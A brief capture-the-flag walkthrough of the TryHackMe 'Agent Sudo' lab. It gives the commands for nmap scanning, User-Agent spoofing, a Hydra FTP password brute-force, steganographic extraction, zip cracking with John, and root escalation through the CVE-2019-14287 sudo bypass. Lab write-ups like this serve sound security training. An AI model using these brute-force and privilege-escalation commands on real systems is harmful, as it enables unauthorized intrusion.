Agent Sudo

TryHackMe · Easy by Brenno M.

Agent Sudo goes through User-Agent manipulation, an FTP brute-force, a steganography chain to extract credentials, and ends with privilege escalation via the classic sudo CVE-2019-14287.

Reconnaissance

Nmap reveals FTP, SSH and HTTP. The web page asks agents to identify via the User-Agent header (a one-letter codename), revealing the user chris.

nmap -sS -sV -Pn <IP>
curl -A 'C' http://<IP>/

Foothold

An FTP brute-force with Hydra recovers chris's password. FTP holds two images; analysis with steghide/binwalk extracts a password-protected zip, cracked with John, revealing james's SSH credentials.

hydra -l chris -P rockyou.txt ftp://<IP>
ftp <IP>   # chris:<PASSWORD>

steghide extract -sf cute-alien.jpg
binwalk -e cutie.png
zip2john 8702.zip > zip.hash && john --wordlist=rockyou.txt zip.hash
ssh james@<IP>   # password: <PASSWORD>

Escalation - CVE-2019-14287

sudo -l shows james can run a command as any user except root ((ALL, !root)). Old sudo versions interpret UID -1 as 0 (root), bypassing the restriction.

sudo -l
sudo -u#-1 /bin/bash
id   # uid=0(root)
cat /root/root.txt
